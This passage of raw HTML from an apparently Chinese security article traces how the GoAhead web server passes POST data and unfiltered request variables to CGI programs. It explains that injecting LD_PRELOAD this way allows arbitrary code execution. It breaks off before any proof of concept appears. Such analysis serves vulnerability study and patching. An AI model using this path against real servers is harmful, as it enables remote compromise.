style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; ssize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; txLen;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Tx content length &nbsp; header value */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; wid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&lt; Index into webs */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#if ME_GOAHEAD_CGI</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *cgiStdin;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Filename for CGI program &nbsp; input */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;cgifd;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; File handle for CGI &nbsp; program input */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#endif</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; struct WebsRoute *route;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Request route */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; struct WebsUser *user;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; User auth record */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; WebsWriteProc &nbsp;&nbsp;writeData;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Handler write I/O event &nbsp; callback. Used by fileHandler */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">} Webs;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">其中说明几个重要字段，后续分析会使用到：rxbuf(接受post提交的数据的buf)、vars(需要CGI处理的变量)、cgiStdin(cgi处理程序的标准输入)、cgifd(cgi处理程序的文件句柄)。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">readEvent(Webs *wp)代码如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsMDnibbfvicb7jicwaWbJicWCSVZmw5kCytA3Np9HxnZS8cRkof9TymnbAg/0?wx_fmt=jpeg" style="cursor: pointer; width: 740px !important; height: 308px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">readEvent中通过函数websRead读取用户提交的数据，并填充到rxbuf中，其中websRead()根据是否是https，采用sslread和socketRead来读取用户提交的数据。数据读取完成后，由于nbytes&gt;0,进入到websPump()函数继续处理。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsuw4J2S9SRiaS3xn5gp4ic0wJUm3BIvUYOFtrxJ6v1NvsMyAjyrojqRCQ/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 445.096px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">websPump 代码结构如下，本质就是一个for循环，停止条件取决于canProceed，然后根据wp-&gt;state来调用相关函数进行处理；刚开始state条件是0，也就是<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">WEBS_BEGIN</span>，进入到 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">parseIncoming</span> 函数处理阶段。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLslXSRSZoXfS2NEdJoo3uvY43prhwVLO0WPVUywb8SNkXjCe4KL6BZLg/0?wx_fmt=jpeg" style="cursor: pointer; width: 687px !important; height: 122px !important;"><br></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">PUBLIC void &nbsp; websPump(Webs *wp)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">{</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; bool&nbsp;&nbsp;&nbsp; canProceed;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; for (canProceed = 1; canProceed; ) {</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (wp-&gt;state) {</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WEBS_BEGIN:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; canProceed = parseIncoming(wp);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WEBS_CONTENT:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; canProceed = processContent(wp);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WEBS_READY:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!websRunRequest(wp)) {</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Reroute if the handler &nbsp; re-wrote the request */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; websRouteRequest(wp);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; wp-&gt;state = WEBS_READY;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; canProceed = 1;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; canProceed = (wp-&gt;state != &nbsp; WEBS_RUNNING);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WEBS_RUNNING:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Nothing to do until websDone &nbsp; is called */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WEBS_COMPLETE:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; canProceed = complete(wp, 1);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;break;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; }</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">}</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">parseIncoming()</span><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"> 函数会 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">parseHeader()</span> 进行 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">http header</span> 头的处理【<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">parseHeader</span>函数中，根据 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">content-length</span> 的值，设置 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">reLen</span> 的值，由于 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">rxLen&gt;0</span> 然后 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">state=WEBS_CONTENT】</span>。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLso5Ebq1Hv4urOxcAjd2TNwX9QVXdVOiaAo0vh9Hrl9gzv85Fl6MmeJmQ/0?wx_fmt=jpeg" style="cursor: pointer; width: 426px !important; height: 48px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">然后进入函数 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">websRouteRequest()</span>，根据1.1节里面提到的route.txt进行<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">request route</span> 处理设置，比如route到cgi处理。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsz2W7nyvrthcalFbiaun8qUpCMzVzFhZy45Huclj6XAnA2o1xktDvqcA/0?wx_fmt=jpeg" style="cursor: pointer; width: 713px !important; height: 155px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">判断 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">route-&gt;handler-&gt;service</span> 是否是<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">cgiHandler</span>，如果是 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">cgiHandler</span>，则先判断method，是否是post，然后设置<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">cgiStdin=websGetCgiCommName()</span>，同时 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">cgifd
 = 
open(cgiStdin)</span>，然后返回 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">1=canProceed</span>，继续在 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">websPump()</span> 函数的for循环中。<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">parseIncoming</span> 函数整体代码如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLs1ich3yDdJPjPtJv3veF4ibVXnSBkVibosj4lCNY3yMrrBFZIJ9M3sxUKw/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 262.431px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">其中函数 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">websGetCgiCommName</span> 调用的是 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">websTempFile</span> 函数，该函数注释说明如下，返回的文件路径是<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">/tmp/cgi***</span>：</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">/**</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; Create a temporary filename</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; This does not guarantee the filename is &nbsp; unique or that it is not already in use by another application.</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; @param dir Directory to locate the temp &nbsp; file. Defaults to the O/S default temporary directory (usually /tmp)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; @param prefix Filename prefix</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; @return An allocated filename string</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; @ingroup Webs</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; @stability Stable</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp; */</span></p></blockquote><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">PUBLIC char &nbsp; *websTempFile(char *dir, char *prefix);</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);font-size: 15px;letter-spacing: 2px;">由于 <span style="color: rgb(79, 79, 79);font-size: 15px;letter-spacing: normal;">state=WEBS_CONTENT</span>，进入到 <span style="color: rgb(79, 79, 79);font-size: 15px;letter-spacing: normal;">processContent()</span> 函数处理：先进行filterChunkData函数的chunk过滤处理，当用户在http
 头部，使用<span style="color: rgb(79, 79, 79);font-size: 15px;letter-spacing: normal;">Transfer-Encoding: 
chunked</span> 时，数据以一系列分块的形式进行发送，分块传输不是分析重点，并且后续poc也不用分块传入，就不深入分析了，简而言之，<span style="color: rgb(79, 79, 79);font-size: 15px;letter-spacing: normal;">filterChunkData</span> 会设 <span style="color: rgb(79, 79, 79);font-size: 15px;letter-spacing: normal;">canProceed=1，wp-&gt;eof=1</span>;后续由于cgifd&gt;0，因此进入到函数 <span style="color: rgb(79, 79, 79);font-size: 15px;letter-spacing: normal;">websProcessCgiData
 (),websProcessCgiData</span> 处理完后，由于eof=1，因此 <span style="color: rgb(79, 79, 79);font-size: 15px;letter-spacing: normal;">state= WEBS_READY</span>。<br></span></p><p style="margin-left: 8px;margin-right: 8px;"><br><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;"></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;"></span><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsbf9NeCU4j59T9HQPPenawia1qlHW6cJrv9UtQsBX1fKdzXicFzcLgEVg/0?wx_fmt=jpeg" style="cursor: pointer; width: 545px !important; height: 466px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">websProcessCgiData</span><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"> 函数：也就是把用户post提交的数据，保存到cgifd中，就是先前通过 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">cgiStdin=websGetCgiCommName()</span> 获得，也就是文件“<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">/tmp/cgi***</span>”。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsLqgNx9g3SEt2AFaalEwkmcfE9KhoaLCkAxfF7yXfAiaZ39S1rYZxvZA/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 191.063px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">此时由于 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">state=
 
WEBS_READY，canProceed=1</span>，进入到<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">websRunRequest(wp)</span> 函数中：该函数中就是先提取url中的var变量，然后设置<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">state=WEBS_RUNNING</span>，然后调用<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">(*route-&gt;handler-&gt;service)(wp)</span>，即 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">cgiHandler
 (wp)</span>,还函数在cgi.c中。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsWqHYbyxevP3UNCyZeky9iaPptncHOqQLInU79ZGSJJHO7eH0BicWicY5A/0?wx_fmt=jpeg" style="cursor: pointer; width: 665px !important; height: 284px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">由于cgiHandler()在处理cgi扩展时，只对 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">REMOTE_HOST</span> 和<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">HTTP_AUTHORIZATION</span> 进行了过滤，其他var变量都会当成可信环境变量，传入到cgi扩展处理进程中。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsHk9AsQQjHVDpR9wzf9rNMTAhqAibIiaDicwFdib25f7wNEdibQ0tf2yEFVA/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 273.337px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">Cgi.c中在处理完参数之后，然后将标准输入、输出重定向到：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">/tmp/cgi***</span>，也就是post数据保存的地方，代码详情如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsu15KCzEo9F6ic1Ox5XjNnFiaK7XcAyZjzlwxe6rmOwygyU14UsmasRkg/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 415.916px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">输入、输出重定向完成后，cgi.c中就调用launchCgi，开始调用cgi的扩展处理进程，并传入上述envp生成的环境变量。【注意：launchCgi分三个版本：windows、unix和VXWORKS，函数别定位错误】</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">找到launchCgi处理函数，代码如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsagPgF5bpFj0gKoEQGaZIhiaqicicOkZHHJicyMibhYG19M1CpBIYzw7CUVw/0?wx_fmt=jpeg" style="cursor: pointer; width: 748px !important; height: 435px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">执行到函数vfork()后，会将子进程（也就是cgi的处理进程）的标准出入、输出重定向到前文分析到的<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">/tmp/cgi***</span>文件，也就是post数据存放的文件；然后调用execve()调用cgi处理进程，并传递envp中的系统环境变量，结合上文分析的LA_PRELOAD变量，可以实现任意代码执行。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">但是现在还存在一个问题，就是通过环境变量：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 